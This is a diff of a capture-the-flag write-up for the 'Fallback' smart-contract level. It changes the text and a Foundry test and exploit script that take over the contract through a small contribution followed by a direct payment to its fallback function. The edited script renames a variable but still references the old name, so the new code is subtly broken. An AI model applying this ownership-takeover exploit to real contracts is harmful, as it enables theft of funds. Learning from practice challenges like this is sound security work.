@@ -1,4 +1,4 @@
-## 01. Fallback
+## 👾 01. Fallback
 
 <br>
 
@@ -230,8 +230,8 @@ type                    2
 ```solidity
 contract FallbackTest is Test {
     Fallback public level;
-    address instance = vm.addr(0x1); 
-    address hacker = vm.addr(0x2); 
+    address instance = vm.addr(0x10053); 
+    address hacker = vm.addr(0x1337); 
 
     function setUp() public {
       vm.deal(hacker, 0.0001 ether);
@@ -324,7 +324,7 @@ contract FallbackTest is Test {
 
 <br>
 
-* run:
+* which can be run with:
 
 <br>
 
@@ -383,27 +383,20 @@ Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
 
 <br>
 
-* submit with `script/01/Fallback.s.sol`:
+* and submitted with `script/01/Fallback.s.sol`:
 
 <br>
 
 ```solidity
 contract Exploit is Script {
 
-      /////////////////////////////////////////
-      // CHANGE: to the current instance address
-      /////////////////////////////////////////
-    
-      address level_instance = 0xD4E2471CA863251b61a1009223Ee23D2F23f057d;
+      address instance = vm.envAddress("INSTANCE_LEVEL1");
       Fallback level = Fallback(payable(address(level_instance)));
 
       function run() public {
 
           vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-          //////////////////////////////
-          // Copy the exploit from test
-          //////////////////////////////
           level.contribute{value: 1 wei}();
           (bool sent, ) = address(level).call{value: 1 wei}("");
           require(sent, "Failed to call send()");
